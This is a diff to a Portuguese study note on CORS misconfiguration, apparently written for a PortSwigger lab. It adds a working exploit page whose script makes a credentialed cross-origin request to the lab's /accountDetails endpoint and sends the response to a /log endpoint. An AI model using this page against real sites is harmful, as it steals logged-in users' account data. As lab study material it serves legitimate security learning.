@@ -16,6 +16,29 @@ O exemplo que foi utilizado foi o basic origin reflection que pega os dados de u
 * [Nuclei templates](https://github.com/projectdiscovery/nuclei)
 * [Corsy - CORS Misconfiguration Scanner](https://github.com/s0md3v/Corsy)
 
+## HTML utilizado
+
+```
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = "https://ac211f241efad3f2c045255700630006.web-security-academy.net"
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE){
+                    fetch("/log?key=" + xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + "/accountDetails", true);
+            xhr.withCredentials = true;
+            xhr.send(null)
+        </script>
+    </body>
+</html>
+```
+
 ## Labs para estudo 🔬
 
 * [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
